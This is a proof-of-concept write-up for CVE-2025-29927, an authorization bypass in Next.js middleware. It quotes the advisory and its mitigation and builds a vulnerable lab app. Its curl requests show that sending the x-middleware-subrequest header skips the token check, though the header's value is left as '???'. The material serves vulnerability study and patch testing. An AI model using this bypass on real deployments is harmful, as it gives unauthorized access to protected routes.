                      ___________________________

                             CVE-2025-29927
                       Next.js Middleware Bypass
                      ___________________________


Table of Contents
_________________

1. Advisory
2. Environment Setup
3. PoC


1 Advisory
==========

  Next.js is a React framework for building full-stack web applications.

  Prior to 14.2.25 and 15.2.3, it is possible to bypass authorization
  checks within a Next.js application, if the authorization check occurs
  in middleware.

  If patching to a safe version is infeasible, it is recommend that you
  prevent external user requests which contain the
  `x-middleware-subrequest' header from reaching your Next.js
  application.

  This vulnerability is fixed in 14.2.25 and 15.2.3.
  - <https://nvd.nist.gov/vuln/detail/CVE-2025-29927>


2 Environment Setup
===================

  Setup vulnerable environment
  ,----
  | npx create-next-app@14.2.24 my-next-app
  | cd my-next-app
  | npm run dev
  `----

  Create simple API endpoint
  ,----
  | mkdir -p /app/api/hello
  | touch /app/api/hello/route.js
  `----

  ,----
  | export async function GET(req) {
  |   return new Response(JSON.stringify({ message: "Hello, API!" }), {
  |     headers: { "Content-Type": "application/json" },
  |   });
  | }
  `----

  Create simple middleware
  ,----
  | touch middleware.js
  `----

  ,----
  | import { NextResponse } from "next/server";
  | 
  | export function middleware(req) {
  |   const authHeader = req.headers.get("authorization");
  | 
  |   if (!authHeader || authHeader !== "Bearer my-secret-token") {
  |     return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  |   }
  | 
  |   return NextResponse.next(); // Allow the request to continue
  | }
  | 
  | // Apply middleware to all API routes
  | export const config = {
  |   matcher: "/api/:path*",
  | };
  `----


3 PoC
=====

  Basic request is protected by middleware.
  ,----
  | curl http://localhost:3000/api/hello
  `----

  ,----
  | {"error":"Unauthorized"}
  `----

  With proper header the middleware let's us in.
  ,----
  | curl -H "Authorization: Bearer my-secret-token" http://localhost:3000/api/hello
  `----

  ,----
  | {"message":"Hello, API!"}
  `----

  However, by using the `x-middleware-subrequest' header, it is possible
  to bypass the middlware and skip the authorization check.

  ,----
  | curl -H "x-middleware-subrequest: ???" http://localhost:3000/api/hello
  `----
